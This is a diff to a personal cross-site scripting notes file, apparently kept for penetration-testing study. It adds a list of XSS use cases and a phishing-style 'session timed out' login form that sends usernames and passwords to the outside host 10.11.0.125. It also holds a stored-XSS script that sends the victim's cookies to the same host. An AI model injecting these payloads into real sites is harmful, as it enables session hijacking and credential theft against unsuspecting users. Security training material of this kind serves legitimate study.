@@ -1,5 +1,10 @@
 #xss cross site scripting dom based reflected persistent serverside
 
+#USE CASES FOR XSS:
+1. Account Hijacking - steal session cookies via Image method below, or other method
+2. Password Theft - See password theft example at the bottom
+3. Unauthorized Action - if a user has knowlege of other functions in javascript that can be performed only by an authorized user, those actions can be taken/manipulated to send sensitive data to the attacker, or perform actions on behalf of the user. 
+
 #Stored/persistent excerpt that could be used for comment board or something:
 <script>new Image().src="http://10.11.0.125/bogus.php?output="+document.cookie;</script>
 Victim browses to the site that has XSS stored on the server, and the javascript is executed in the BROWSER,
@@ -37,3 +42,14 @@ else
     document.write("You are using an unknown browser.");
 }
 </script>
+
+#Password Theft example:
+#Got this from here (credit): https://www.dionach.com/blog/the-real-impact-of-cross-site-scripting
+<div style="position:absolute;top:50%;left:50%;margin: -100px 0 0 -100px;height=100px;width=100px;z-index:1;border-width:1px;border-style:solid; border-color:#D3D3D3">
+  <h3>Your session has timed out.</h3>
+  <form action=http://10.11.0.125>
+    Username:<br><input type="text" name="user"><br>
+    Password:<br><input type="password" name="pass"><br><br>
+    <input type="submit" value="Logon">
+  </form>
+</div>
